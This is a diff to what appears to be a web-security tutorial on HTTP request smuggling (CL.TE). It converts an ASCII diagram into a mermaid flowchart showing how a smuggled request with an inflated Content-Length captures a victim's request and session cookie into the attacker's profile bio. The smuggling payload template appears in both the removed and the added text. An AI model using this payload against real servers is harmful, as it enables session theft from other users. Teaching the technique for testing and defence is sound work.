@@ -19,43 +19,16 @@ When the next legitimate user's request comes down the TCP pipeline, the back-en
 Think of it like submitting a form to a clerk. You hand the clerk a form that says "My Name is: ". Before you write your name, you freeze. The clerk stands there, waiting for the rest of the name. The next person walks up to the desk and hands the clerk their passport. The clerk assumes the passport *is* your name, staples it to your form, and files it in your cabinet.
 
 ## ASCII Diagram
-```text
-================================================================================
-                    CAPTURING USER REQUESTS
-================================================================================
+```mermaid
+flowchart TD
+    Attacker["1. Attacker Sends Smuggling Payload (CL.TE) <br/> POST / HTTP/1.1 <br/> Content-Length: ... <br/> Transfer-Encoding: chunked <br/> <br/> 0 <br/> <br/> POST /update_bio HTTP/1.1 <br/> Host: vulnerable.com <br/> Cookie: session=attacker_token <br/> Content-Type: application/x-www-form-urlencoded <br/> Content-Length: 400 <br/> <br/> bio=hello"]
+    Back["2. Back-End Logic <br/> 'I am processing an update_bio request. The body starts with bio=hello. <br/> It says it has 400 bytes total. I will wait for the remaining 391 bytes.'"]
+    Victim["3. Victim sends a legitimate request <br/> GET /dashboard HTTP/1.1 <br/> Host: vulnerable.com <br/> Cookie: session=SUPER_SECRET_VICTIM_TOKEN <br/> User-Agent: Mozilla/5.0..."]
+    Combine["4. Back-End Concatenation <br/> The Back-End treats the Victim's request as the missing 391 bytes! <br/> It updates the attacker's bio to: <br/> `helloGET /dashboard HTTP/1.1\r\nHost: vulnerable.com\r\nCookie: session=SUPER_SECRET_VICTIM_TOKEN...` <br/> <br/> Result: Attacker views their own profile and sees the Victim's raw request!"]
 
-[1. Attacker Sends Smuggling Payload (CL.TE)]
-POST / HTTP/1.1
-Content-Length: ...
-Transfer-Encoding: chunked
-
-0
-
-POST /update_bio HTTP/1.1
-Host: vulnerable.com
-Cookie: session=attacker_token
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 400            <-- HUGE LENGTH!
-
-bio=hello                      <-- Missing 391 bytes of data!
-
-[2. Back-End Logic]
-"I am processing an update_bio request. The body starts with 'bio=hello'.
-It says it has 400 bytes total. I will wait for the remaining 391 bytes."
-
-[3. Victim sends a legitimate request]
-GET /dashboard HTTP/1.1
-Host: vulnerable.com
-Cookie: session=SUPER_SECRET_VICTIM_TOKEN
-User-Agent: Mozilla/5.0...
-
-[4. Back-End Concatenation]
-The Back-End treats the Victim's request as the missing 391 bytes!
-It updates the attacker's bio to:
-`helloGET /dashboard HTTP/1.1\r\nHost: vulnerable.com\r\nCookie: session=SUPER_SECRET_VICTIM_TOKEN...`
-
-[Result: Attacker views their own profile and sees the Victim's raw request!]
-================================================================================
+    Attacker --> Back
+    Victim --> Combine
+    Back --> Combine
 ```
 
 ## How to Find It
